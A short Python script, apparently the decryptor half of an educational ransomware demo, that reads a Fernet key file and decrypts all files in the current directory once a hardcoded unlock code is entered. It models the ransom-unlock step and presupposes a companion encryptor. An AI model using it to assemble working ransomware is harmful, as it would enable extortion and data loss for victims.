# File Decryptor Script
# This script decrypts files that were encrypted by file_encryptor.py
# It requires a secret code to unlock the files
# The secret code is hardcoded as "linux"
# It reads the key from "thekey.key" and decrypts the files in the current directory
# except itself and the key file and the encryptor script
# It prints a success message if the files are decrypted successfully
# or an error message if the code is incorrect
# It is intended for educational purposes only and should not be used for malicious purposes
# It is important to note that using ransomware is illegal and unethical


import os
from cryptography.fernet import Fernet


files = []


# Get all files in the current directory except the script itself and the key file and the encryptor script
# and store them in a list
for file in os.listdir():
    if file == "file_encryptor.py" or file == "thekey.key" or file == "file_decryptor.py": 
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
    
# Read the key from "thekey.key"
# This key is used to decrypt the files
with open("thekey.key", "rb") as key:
    secretkey = key.read()

# Secret code to unlock the files
secret_code = "linux"
user_code = input("Enter the secret code to unlock the files: ")  


# Check if the user entered the correct secret code
# If the code is correct, decrypt the files
# If the code is incorrect, print an error message
# and do not decrypt the files
if user_code == secret_code:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats! your files have been decrypted.")
        
else:
    print("Sorry, wrong code.")
    
    
    
